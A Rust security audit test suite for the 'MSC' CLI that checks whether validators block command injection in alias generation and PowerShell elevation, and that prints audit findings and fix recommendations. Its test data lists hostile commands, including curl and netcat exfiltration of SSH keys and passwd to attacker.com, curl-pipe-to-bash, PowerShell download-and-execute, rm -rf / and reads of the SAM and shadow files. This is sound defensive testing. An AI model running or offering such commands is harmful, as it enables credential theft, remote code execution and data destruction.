// SECURITY AUDIT TEST SUITE
// =========================
// Comprehensive security tests documenting all identified vulnerabilities
// and attack surfaces in the MSC CLI application.
//
// This file serves as:
// 1. Documentation of security findings
// 2. Test suite to prevent regressions
// 3. Guide for security improvements
//
// Severity Levels:
// - CRITICAL: Immediate code execution, data exfiltration
// - HIGH: Privilege escalation, significant data exposure
// - MEDIUM: Information disclosure, DoS potential
// - LOW: Edge cases, theoretical attacks

use msc::core::validation;
use msc::platform::elevation;

// ============================================================================
// CRITICAL SEVERITY TESTS
// ============================================================================

#[test]
fn test_critical_alias_command_injection_unix() {
    // CRITICAL: Command injection in Unix alias generator
    // Location: src/core/alias_generator.rs:106-109
    //
    // The Unix alias generator creates bash scripts with unsanitized commands:
    //   exec {alias.command} "$@"
    //
    // This test validates that command injection attacks are blocked
    // while legitimate commands are allowed.

    // ========================================================================
    // PART 1: MALICIOUS COMMANDS (MUST BE BLOCKED)
    // ========================================================================

    println!("\n🔴 Testing malicious commands (must be blocked):\n");

    // Category: Command separators and chaining
    let command_separators = vec![
        ("echo hello; rm -rf /", "semicolon separator"),
        ("echo test && rm -rf ~/*", "AND operator"),
        ("ls || curl evil.com", "OR operator"),
    ];

    for (cmd, attack_type) in command_separators {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: Command substitution
    let command_substitution = vec![
        ("echo `whoami`", "backtick substitution"),
        ("echo $(cat /etc/passwd)", "dollar-paren substitution"),
        (
            "curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)",
            "data exfiltration via substitution",
        ),
    ];

    for (cmd, attack_type) in command_substitution {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: Backgrounding and process manipulation
    let backgrounding = vec![
        (
            "python -m http.server 8000 & curl evil.com",
            "background process with chaining",
        ),
        ("sleep 1 &", "background process"),
    ];

    for (cmd, attack_type) in backgrounding {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: Pipe attacks
    let pipe_attacks = vec![
        ("echo | /bin/bash -c 'malicious code'", "pipe to shell"),
        ("curl evil.com/malware.sh | bash", "pipe to bash"),
        ("cat /etc/passwd | nc attacker.com 1234", "pipe to netcat"),
    ];

    for (cmd, attack_type) in pipe_attacks {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: Redirection attacks
    let redirection_attacks = vec![
        (
            "cat /etc/shadow > /tmp/stolen",
            "output redirection to steal files",
        ),
        (
            "echo malicious > ~/.bashrc",
            "output redirection to modify config",
        ),
        ("cat < /etc/passwd", "input redirection"),
    ];

    for (cmd, attack_type) in redirection_attacks {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: Wildcard attacks
    let wildcard_attacks = vec![
        ("rm -rf *", "wildcard deletion"),
        ("cat *.txt", "wildcard expansion"),
        ("chmod 777 /etc/*", "wildcard permission change"),
    ];

    for (cmd, attack_type) in wildcard_attacks {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: Path manipulation
    let path_manipulation = vec![
        (
            "export PATH=/tmp:$PATH && malicious_binary",
            "PATH manipulation with execution",
        ),
        (
            "cd ~ && rm -rf important",
            "directory traversal with deletion",
        ),
    ];

    for (cmd, attack_type) in path_manipulation {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // ========================================================================
    // PART 2: LEGITIMATE COMMANDS (MUST BE ALLOWED)
    // ========================================================================

    println!("\n🟢 Testing legitimate commands (must be allowed):\n");

    let legitimate_commands = vec![
        ("ls -la", "list files with details"),
        ("git status", "check git status"),
        ("cargo build --release", "build Rust project"),
        ("python3 script.py", "run Python script"),
        ("node index.js", "run Node.js script"),
        ("docker ps", "list Docker containers"),
        ("npm install", "install npm packages"),
        ("echo hello world", "simple echo"),
        ("cd /path/to/dir", "change directory"),
        ("python -m venv env", "create Python virtual environment"),
    ];

    for (cmd, description) in legitimate_commands {
        let result = validation::validate_alias_command(cmd);
        assert!(
            result.is_ok(),
            "❌ FAILED to allow legitimate command ({}): {}",
            description,
            cmd
        );
        println!("  ✅ Allowed {}: {}", description, cmd);
    }

    println!("\n✅ All Unix command injection tests passed!\n");
}

#[test]
fn test_critical_alias_command_windows_equivalent() {
    // CRITICAL: Command injection in Windows alias generator
    // On Windows, aliases use shim executables that read from aliases.json
    // The command is still stored unsanitized in JSON and could be exploited
    // if the shim doesn't properly escape when executing
    //
    // This test validates that command injection attacks are blocked
    // while legitimate Windows commands are allowed.

    // ========================================================================
    // PART 1: MALICIOUS COMMANDS (MUST BE BLOCKED)
    // ========================================================================

    println!("\n🔴 Testing malicious Windows commands (must be blocked):\n");

    // Category: PowerShell injection
    let powershell_injection = vec![
        (
            "notepad & powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"",
            "PowerShell download and execute"
        ),
        (
            "dir & powershell -c Invoke-Expression",
            "PowerShell Invoke-Expression"
        ),
        (
            "echo test & powershell IEX",
            "PowerShell IEX shorthand"
        ),
    ];

    for (cmd, attack_type) in powershell_injection {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: CMD.exe injection
    let cmd_injection = vec![
        (
            "echo hello && calc.exe && curl evil.com",
            "CMD chaining with AND",
        ),
        ("dir || malicious.exe", "CMD chaining with OR"),
        ("notepad & calc", "CMD background execution"),
    ];

    for (cmd, attack_type) in cmd_injection {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: File manipulation and redirection
    let file_manipulation = vec![
        (
            "type C:\\Windows\\System32\\config\\SAM > C:\\temp\\stolen.txt",
            "file redirection to steal data",
        ),
        (
            "echo malicious > C:\\Users\\Public\\startup.bat",
            "output redirection to startup",
        ),
        (
            "del C:\\*.* && echo done",
            "wildcard deletion with chaining",
        ),
    ];

    for (cmd, attack_type) in file_manipulation {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: Batch variable expansion
    let batch_variables = vec![
        ("echo %PATH%", "environment variable expansion"),
        ("set VAR=malicious & %VAR%", "variable set and execute"),
        ("echo %USERPROFILE%", "user profile variable"),
    ];

    for (cmd, attack_type) in batch_variables {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // Category: CMD escape character
    let escape_attacks = vec![
        ("dir ^& malicious", "CMD escape character"),
        ("echo test^|more", "escaped pipe"),
    ];

    for (cmd, attack_type) in escape_attacks {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_err(),
            "❌ FAILED to block {} attack: {}",
            attack_type,
            cmd
        );
        println!("  ✅ Blocked {}: {}", attack_type, cmd);
    }

    // ========================================================================
    // PART 2: LEGITIMATE COMMANDS (MUST BE ALLOWED)
    // ========================================================================

    println!("\n🟢 Testing legitimate Windows commands (must be allowed):\n");

    let legitimate_commands = vec![
        ("dir", "list directory contents"),
        ("notepad file.txt", "open file in notepad"),
        ("python script.py", "run Python script"),
        ("node index.js", "run Node.js script"),
        ("cargo build --release", "build Rust project"),
        ("git status", "check git status"),
        ("npm install", "install npm packages"),
        ("echo Hello World", "simple echo"),
        ("cd C:\\Users\\Documents", "change directory"),
        ("code .", "open VS Code"),
    ];

    for (cmd, description) in legitimate_commands {
        let result = validation::validate_alias_command_windows(cmd);
        assert!(
            result.is_ok(),
            "❌ FAILED to allow legitimate Windows command ({}): {}",
            description,
            cmd
        );
        println!("  ✅ Allowed {}: {}", description, cmd);
    }

    println!("\n✅ All Windows command injection tests passed!\n");
}

// ============================================================================
// HIGH SEVERITY TESTS
// ============================================================================

#[test]
fn test_high_powershell_argument_injection() {
    // HIGH: Argument injection in PowerShell elevation
    // Location: src/platform/elevation.rs:52-60
    //
    // La plantilla del comando de elevación es vulnerable a inyección:
    // Start-Process -FilePath '{}' -ArgumentList '{}' -Verb RunAs

    // Programa de ejemplo que se intenta ejecutar.
    let target_program = "C:\\path\\to\\my-tool.exe";

    println!("\n🔴 Testing PowerShell command injection via quote breaking:\n");

    // ========================================================================
    // TIPO 1: INYECCIÓN DE COMANDOS (Romper comillas de ArgumentList)
    // ========================================================================

    let command_injection_args = vec![
        // ====================================================================
        // CATEGORÍA 1: Separadores de comandos básicos
        // ====================================================================
        (
            "clean start'; Start-Process calc.exe; '",
            "punto y coma con espacio",
        ),
        (
            "';Start-Process calc.exe;'",
            "punto y coma sin espacio (evasión)",
        ),
        (
            "'; IEX (curl http://evil.com/payload.ps1); '",
            "descargar payload remoto",
        ),
        (
            "'; Remove-Item -Recurse C:\\Important; '",
            "eliminar archivos importantes",
        ),
        // ====================================================================
        // CATEGORÍA 2: Operadores de pipe
        // ====================================================================
        ("'|calc.exe", "pipe para ejecutar comando (evasión)"),
        ("' | Start-Process calc.exe", "pipe con espacios"),
        // ====================================================================
        // CATEGORÍA 3: Operadores ampersand
        // ====================================================================
        ("'&calc.exe", "ampersand para ejecutar comando (evasión)"),
        ("' & Start-Process calc.exe", "ampersand con espacios"),
        // ====================================================================
        // CATEGORÍA 4: Separadores de nueva línea
        // ====================================================================
        ("'\ncalc.exe", "nueva línea como separador (evasión)"),
        ("'\r\nStart-Process calc.exe", "CRLF como separador"),
        // ====================================================================
        // CATEGORÍA 5: Variables de PowerShell (técnicas avanzadas)
        // ====================================================================
        (
            "'; $a=calc; Start-Process $a; '",
            "variables temporales para ejecutar comando",
        ),
        ("'; $x='calc.exe'; & $x; '", "variable con call operator"),
        (
            "'; $env:TEMP='C:\\'; rm $env:TEMP; '",
            "manipulación de variables de entorno",
        ),
        // ====================================================================
        // CATEGORÍA 6: Call Operator (&) - Ejecución de strings
        // ====================================================================
        (
            "'; & 'C:\\Windows\\System32\\calc.exe'; '",
            "call operator para ejecutar string",
        ),
        ("'; & 'notepad'; '", "call operator con nombre de programa"),
        (
            "'; & {Start-Process calc}; '",
            "call operator con script block",
        ),
        // ====================================================================
        // CATEGORÍA 7: Expansión de comandos
        // ====================================================================
        (
            "'; Write-Host \"Injected: $(whoami)\"; '",
            "command substitution en comillas dobles",
        ),
        ("'; $(Get-Process); '", "command substitution directa"),
        // ====================================================================
        // CATEGORÍA 8: Técnicas mixtas y ofuscación
        // ====================================================================
        ("'; iex 'calc'; '", "invoke-expression abreviado"),
        ("'; .('calc'); '", "dot sourcing para ejecutar comando"),
        (
            "'''; Start-Process calc.exe; '",
            "intento de inyección después de secuencia de escape '",
        ),
    ];

    for (arg, description) in command_injection_args {
        // Ejecutamos la función vulnerable que construye la cadena de PowerShell
        let command_string = elevation::simulate_elevation_command(target_program, arg);

        // VERIFICACIÓN ROBUSTA DE INYECCIÓN:
        // =================================
        // La inyección ocurre cuando el argumento malicioso logra "romper" las comillas
        // simples del ArgumentList de PowerShell.
        //
        // Patrón vulnerable:
        //   Start-Process -FilePath '...' -ArgumentList 'argumento malicioso' -Verb RunAs
        //
        // Un argumento legítimo debería estar completamente dentro de las comillas simples:
        //   ArgumentList 'argumento seguro'
        //
        // La inyección ocurre cuando se rompen las comillas con operadores de PowerShell:
        //   ArgumentList 'malicioso'; Start-Process calc.exe; ''
        //                         ^^^ Cierra comillas prematuramente
        //
        // PATRONES DE INYECCIÓN A DETECTAR:
        // ---------------------------------
        // 1. '; o ' ;  - Punto y coma: separador de comandos
        // 2. '|        - Pipe: redirigir salida a otro comando
        // 3. '& o ' &  - Ampersand: ejecutar comando/Call operator
        // 4. '\n o \r  - Nueva línea: separador de comandos
        // 5. '$        - Variables de PowerShell ($a, $env:, etc.)
        // 6. '.        - Dot sourcing operator
        //
        // NOTA IMPORTANTE sobre el signo $:
        // PowerShell NO expande variables dentro de comillas simples ('...'),
        // PERO si el atacante cierra las comillas con '; ..., puede luego
        // usar variables como: '; $x=calc; & $x; '

        let is_injected = command_string.contains("';") ||   // Punto y coma (con o sin espacio después)
            command_string.contains("' ;") ||  // Punto y coma con espacio antes
            command_string.contains("'|") ||   // Pipe sin espacio
            command_string.contains("' |") ||  // Pipe con espacio
            command_string.contains("'&") ||   // Ampersand sin espacio
            command_string.contains("' &") ||  // Ampersand con espacio
            command_string.contains("'\n") ||  // Nueva línea
            command_string.contains("'\r") ||  // Retorno de carro
            command_string.contains("' $") ||  // Variable de PowerShell con espacio
            command_string.contains("' .") ||  // Dot sourcing con espacio
            // Nota: No detectamos '. ni '$ sin espacio porque son menos comunes
            // pero podrían agregarse si se identifican casos reales
            (command_string.contains("'; $") || command_string.contains("'; .")); // Combo común

        assert!(
            !is_injected, // <- EL CAMBIO: ¡NEGACIÓN! Si es inyectado (true), el test falla.
            "❌ CRÍTICO: El código es VULNERABLE. Se detectó inyección de comandos.\n\
                 Descripción: {}\n\
                 Argumento malicioso: {}\n\
                 Comando resultante (muestra la vulnerabilidad): {}",
            description,
            arg,
            command_string
        );

        if !is_injected {
            println!(
                "  ✅ SEGURO: El comando fue sanitizado correctamente. Argumento: {}",
                arg
            );
        }
    }

    // ========================================================================
    // TIPO 2: NOTA SOBRE INYECCIÓN DE ARGUMENTOS DE POWERSHELL
    // ========================================================================

    println!("📝 NOTA: Inyección de argumentos de PowerShell:");
    println!("   El argumento '-WindowStyle Hidden -NoNewWindow' no rompe comillas");
    println!("   pero modifica el comportamiento de Start-Process.");
    println!("   Esto NO es inyección de comandos, sino manipulación de argumentos.");
    println!("   Aunque es un problema de seguridad menor, no permite ejecución");
    println!("   arbitraria de código.\n");

    println!("✅ Test de inyección de comandos PowerShell completado.\n");
}

#[test]
fn test_high_binary_download_without_verification() {
    // HIGH: yt-dlp binary downloaded without cryptographic verification
    // Location: src/core/yt_dlp_manager.rs:66-91
    //
    // Attack vectors:
    // 1. Man-in-the-Middle (if HTTPS is compromised)
    // 2. GitHub account compromise
    // 3. Supply chain attack
    //
    // Current implementation:
    //   - Downloads from GitHub releases
    //   - No signature verification
    //   - No checksum verification
    //   - No hash verification

    println!("⚠️  HIGH: yt-dlp downloaded without verification");
    println!("Attack scenarios:");
    println!("  1. Attacker compromises TLS certificate");
    println!("  2. Attacker gains access to yt-dlp GitHub releases");
    println!("  3. Attacker performs MitM on corporate network");
    println!("");
    println!("Recommendation:");
    println!("  - Verify GPG signature from yt-dlp");
    println!("  - Compare SHA256 checksum");
    println!("  - Pin expected certificate");

    // TODO: Implement binary verification
    // Example expected behavior:
    // let expected_hash = get_known_good_hash(version);
    // let actual_hash = sha256(&downloaded_bytes);
    // assert_eq!(expected_hash, actual_hash);
}

#[test]
fn test_high_url_credentials_exposure() {
    // HIGH: URLs with embedded credentials are logged
    // Location: src/commands/vget.rs:302
    //
    // The command prints the full URL which may contain credentials

    let urls_with_creds = vec![
        "https://admin:secretP@ssw0rd@private-server.com/video.mp4",
        "https://user:token123@api.example.com/download",
        "http://root:toor@192.168.1.100:8080/secure/file",
    ];

    for url in urls_with_creds {
        // These URLs are technically valid and pass validation
        let result = validation::validate_url(url);
        assert!(result.is_ok(), "URL with credentials is valid");

        println!("⚠️  HIGH: Credentials would be exposed in logs:");
        println!("    URL: {}", url);
        println!("    Output: Ejecutando: Command {{ ... \"{}\" }}", url);
        println!("");

        // TODO: Redact credentials from logs
        // Expected: https://***:***@private-server.com/video.mp4
    }
}

// ============================================================================
// MEDIUM SEVERITY TESTS
// ============================================================================

#[test]
fn test_medium_url_validation_bypass_query_params() {
    // MEDIUM: URL validation can be bypassed using query parameters
    // Location: src/core/validation.rs:52-57
    //
    // Current validation checks for "& " or " &" but allows other patterns

    let bypass_attempts = vec![
        // Command injection in query params (might not work with yt-dlp, but not validated)
        "https://youtube.com/watch?v=abc&cmd=`whoami`",
        "https://example.com?param=value&;rm -rf /",
        "https://example.com?test=$(/bin/bash -c 'evil')",
        // Special characters in fragments
        "https://example.com#fragment;curl evil.com",
        "https://example.com#`whoami`",
    ];

    for url in bypass_attempts {
        let result = validation::validate_url(url);

        if result.is_ok() {
            println!("⚠️  MEDIUM: URL validation bypassed: {}", url);
        }

        // Note: yt-dlp likely sanitizes these, but our validation doesn't catch them
    }
}

#[test]
fn test_medium_race_condition_alias_generation() {
    // MEDIUM: TOCTOU race condition in alias generation
    // Location: src/commands/alias.rs:59-75
    //
    // Steps:
    // 1. config.save()         <- Config written to disk
    // 2. generator.generate()  <- Executable created from config
    //
    // Attack window: Between save and generate, attacker could:
    // - Modify aliases.json
    // - Replace with malicious commands
    // - Symlink to malicious config

    println!("⚠️  MEDIUM: Race condition in alias generation");
    println!("Attack scenario:");
    println!("  1. User runs: msc alias add safe 'echo hello'");
    println!("  2. config.save() writes aliases.json");
    println!("  3. Attacker replaces aliases.json with malicious version");
    println!("  4. generator.generate() creates executable with malicious command");
    println!("");
    println!("Requirements:");
    println!("  - Filesystem access");
    println!("  - Precise timing");
    println!("  - inotify/FileSystemWatcher to detect save");
    println!("");
    println!("Mitigation:");
    println!("  - Use atomic operations");
    println!("  - Verify config before generating executable");
    println!("  - Use file locking");
}

#[test]
fn test_medium_alias_json_tampering() {
    // MEDIUM: aliases.json can be tampered with directly
    // Location: src/core/alias.rs
    //
    // The aliases.json file is read without integrity verification

    println!("⚠️  MEDIUM: Alias config has no integrity protection");
    println!("Attacker with filesystem access could:");
    println!("  1. Modify ~/.config/msc/aliases/aliases.json");
    println!("  2. Inject malicious commands");
    println!("  3. Wait for user to execute alias");
    println!("");
    println!("Example malicious JSON:");
    println!(
        r#"{{
  "aliases": {{
    "ll": {{
      "name": "ll",
      "command": "ls -la; curl http://attacker.com/exfil?data=$(whoami)",
      "created_at": "2024-01-01T00:00:00Z"
    }}
  }}
}}"#
    );
    println!("");
    println!("Mitigation:");
    println!("  - Sign aliases.json with HMAC");
    println!("  - Verify signature on load");
    println!("  - Warn user if modified externally");
}

#[test]
fn test_medium_config_bin_tampering() {
    // MEDIUM: config.bin uses bincode without authentication
    // Location: src/core/config.rs
    //
    // Bincode deserialization without authentication is vulnerable to tampering

    println!("⚠️  MEDIUM: config.bin has no integrity protection");
    println!("Attacker could:");
    println!("  1. Modify ~/.config/msc/config.bin");
    println!("  2. Change work_path to malicious directory");
    println!("  3. Change video_path to sensitive location");
    println!("  4. Modify clean_paths to delete important files");
    println!("");
    println!("Potential impact:");
    println!("  - msc clean could delete wrong directories");
    println!("  - msc work map could scan malicious directory");
    println!("  - Path traversal to sensitive locations");
    println!("");
    println!("Mitigation:");
    println!("  - Add HMAC authentication to config.bin");
    println!("  - Validate all paths on load");
    println!("  - Use JSON instead for transparency");
}

// ============================================================================
// LOW SEVERITY TESTS
// ============================================================================

#[test]
fn test_low_case_sensitive_protocol() {
    // LOW: Protocol validation is case-sensitive
    // Location: src/core/validation.rs:28-33
    //
    // URLs with uppercase protocols are rejected

    let urls = vec![
        "HTTP://example.com",
        "HTTPS://example.com",
        "HtTpS://example.com",
    ];

    for url in urls {
        let result = validation::validate_url(url);
        assert!(result.is_err(), "Should reject uppercase protocol: {}", url);

        // This is fine (browsers normalize), but documenting the behavior
    }
}

#[test]
fn test_low_url_length_dos() {
    // LOW: Extremely long URLs could cause DoS
    // Location: src/core/validation.rs:60-66
    //
    // Current limit: 2048 characters (good)

    let long_url = format!("https://{}.com", "a".repeat(10000));
    let result = validation::validate_url(&long_url);

    assert!(result.is_err(), "Should reject extremely long URL");
    assert!(result.unwrap_err().to_string().contains("too long"));

    // ✅ Already properly mitigated
}

#[test]
fn test_low_directory_path_validation_edge_cases() {
    // LOW: Edge cases in directory validation
    // Location: src/core/validation.rs:154-205

    let edge_cases = vec![
        // Whitespace-only (rejected ✅)
        "   ", "\t\t", "\n", // Valid but unusual
        ".", "..", // Interesting: should this be allowed?
        // Hidden directories (Unix)
        ".hidden", "..hidden",
    ];

    for path in edge_cases {
        let result = validation::validate_directory_path(path);
        println!("Directory '{}' -> {:?}", path.escape_default(), result);
    }
}

// ============================================================================
// SAFE OPERATIONS (Already Well Protected)
// ============================================================================

#[test]
fn test_safe_path_traversal_protection() {
    // ✅ SAFE: Path traversal is well protected

    let traversal_attempts = vec![
        "../../../etc/passwd",
        "..\\..\\Windows\\System32",
        "videos/../../../sensitive",
    ];

    for path in traversal_attempts {
        let result = validation::validate_output_path(path);
        assert!(
            result.is_err(),
            "Correctly rejects path traversal: {}",
            path
        );
    }

    println!("✅ Path traversal protection: EXCELLENT");
}

#[test]
fn test_safe_null_byte_injection() {
    // ✅ SAFE: Null bytes are properly rejected

    let _null_byte_attempts = vec!["path\0malicious", "https://example.com\0evil"];

    assert!(validation::validate_url("https://example.com\0").is_err());
    assert!(validation::validate_output_path("video\0.mp4").is_err());

    println!("✅ Null byte protection: EXCELLENT");
}

#[test]
fn test_safe_absolute_path_rejection() {
    // ✅ SAFE: Absolute paths properly rejected for output

    let absolute_paths = vec![
        "/etc/passwd",
        "C:\\Windows\\System32\\config",
        "/var/log/secrets",
    ];

    for path in absolute_paths {
        let result = validation::validate_output_path(path);
        assert!(result.is_err(), "Correctly rejects absolute path: {}", path);
    }

    println!("✅ Absolute path rejection: EXCELLENT");
}

// ============================================================================
// SECURITY RECOMMENDATIONS
// ============================================================================

#[test]
fn print_security_recommendations() {
    println!("\n");
    println!("═══════════════════════════════════════════════════════════");
    println!("                 SECURITY RECOMMENDATIONS                  ");
    println!("═══════════════════════════════════════════════════════════");
    println!("\n");

    println!("🔴 CRITICAL (Fix Immediately):");
    println!("  1. Sanitize alias commands before writing to bash scripts");
    println!("     - Validate against whitelist of safe commands");
    println!("     - Escape shell metacharacters");
    println!("     - Reject dangerous patterns (;, |, &, $, `, etc.)");
    println!("\n");

    println!("🟠 HIGH (Fix Soon):");
    println!("  2. Verify yt-dlp binary cryptographically");
    println!("     - Check GPG signature from yt-dlp project");
    println!("     - Verify SHA256 checksum against known good");
    println!("  3. Escape PowerShell arguments in elevation");
    println!("     - Use -EncodedCommand instead of -Command");
    println!("     - Properly quote and escape arguments");
    println!("  4. Redact credentials from log output");
    println!("     - Detect user:pass@ in URLs");
    println!("     - Replace with ***:***@");
    println!("\n");

    println!("🟡 MEDIUM (Improve When Possible):");
    println!("  5. Add integrity protection to config files");
    println!("     - HMAC for config.bin and aliases.json");
    println!("     - Detect tampering and warn user");
    println!("  6. Improve URL validation");
    println!("     - Parse URL properly (use url crate)");
    println!("     - Validate each component separately");
    println!("  7. Use atomic file operations for alias generation");
    println!("     - Prevent TOCTOU race conditions");
    println!("\n");

    println!("🟢 LOW (Nice to Have):");
    println!("  8. Make protocol matching case-insensitive");
    println!("  9. Add more comprehensive input fuzzing");
    println!(" 10. Consider sandboxing external binary execution");
    println!("\n");

    println!("✅ Already Well Protected:");
    println!("  ✓ Path traversal prevention");
    println!("  ✓ Null byte injection protection");
    println!("  ✓ Absolute path rejection");
    println!("  ✓ Safe defaults (24h file age)");
    println!("  ✓ User confirmations for dangerous operations");
    println!("  ✓ Ctrl+C safe cancellation");
    println!("  ✓ Rust memory safety");
    println!("\n");

    println!("═══════════════════════════════════════════════════════════\n");
}
